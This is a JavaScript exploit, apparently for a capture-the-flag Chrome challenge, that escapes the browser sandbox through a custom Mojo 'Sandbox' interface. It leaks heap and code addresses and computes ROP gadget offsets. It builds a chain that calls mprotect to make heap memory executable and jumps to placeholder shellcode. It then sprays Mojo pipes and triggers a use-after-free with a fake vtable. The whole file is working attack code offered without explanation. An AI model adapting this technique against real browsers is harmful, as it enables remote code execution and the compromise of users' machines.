function pwn_sbx() {
    (async function pwn() {

        let i = 0;
        var A = new blink.mojom.SandboxPtr();
        Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(A).handle);

        var heap = (await A.getHeapAddress()).addr;
        var text = (await A.getTextAddress()).addr;
        print("text: "+hex(text));
        print("heap: "+hex(heap));
        var base = text - 0x627fc20; // nm --demangle ./chrome | grep 'SandboxImpl::Create'
        pop4 = base + 0x0d8e6554; // pop r12; pop r13; pop r14; pop r15; ret;
        xchg_rsp_rax = base + 0x05c3e9b2; // xchg rsp, rax; ret;
        pop_rax = base + 0x0d8e64f4; // pop rax; ret;
        pop_rsi = base + 0x0d8cdf7c; // pop rsi; ret;
        pop_rdx = base + 0x05caa52e; // pop rdx; ret;
        pop_rdi = base + 0x0749d85d; // pop rdi; ret;
        syscall_ret = base + 0x0972e4b7; // syscall; ret;
        jmp_rax = base + 0x0a425c58; // jmp rax;

        var dataA = new ArrayBuffer(0x800);
        var u8arrA = new Uint8Array(dataA);
        u8arrA.fill(0x90);

        function add_rop(idx, gadget) {
            let arb = new ArrayBuffer(0x8);
            let u8 = new Uint8Array(arb);
            let b64 = new BigInt64Array(arb);
            b64[0] = BigInt(gadget);
            u8arrA.set(u8, idx);
        }

        var cur_idx = 0;
        function add_rop_auto(gadget) {
            add_rop(cur_idx, gadget);
            cur_idx += 8;
        }
        // set ROP chain for mprotect(heap&(~0xfff), 0x2000, 7);    
        add_rop(0x7, pop4);    
        add_rop(0x27, xchg_rsp_rax);    
        cur_idx = 0x27+8;
        add_rop_auto(pop_rax);
        add_rop_auto(10);
        add_rop_auto(pop_rdx);
        add_rop_auto(7);
        add_rop_auto(pop_rsi);
        add_rop_auto(0x2000);
        add_rop_auto(pop_rdi);
        add_rop_auto(BigInt(heap) & (~0xfffn));
        add_rop_auto(syscall_ret);
        add_rop_auto(pop_rax);
        add_rop_auto(heap+0x100);
        add_rop_auto(jmp_rax);
        // set shellcode
        //e.g. sc = [0x90, 0x90, ...];
        sc = [0xcc, 0xcc];
        u8arrA.set(sc, 0xf0);

        await A.pourSand(u8arrA);

        B = [];
        MAX = 0x100;
        for (i = 0; i < MAX; i++) {
            B.push(null);
            B[i] = new blink.mojom.SandboxPtr();
            Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(B[i]).handle);
        }

        let data = new ArrayBuffer(0x820+0x800);
        let b64arr = new BigUint64Array(data);
        let u8arr = new Uint8Array(data);

        b64arr.fill(BigInt(heap+0x18)); // fake vtable
        b64arr[b64arr.length-1] = 0n; // bypass crash

        // trigger vulnerability
        for (i = 0; i < MAX; i++) {
            await B[i].pourSand(u8arr);
            await B[i].ptr.reset();
        }
   })();
}
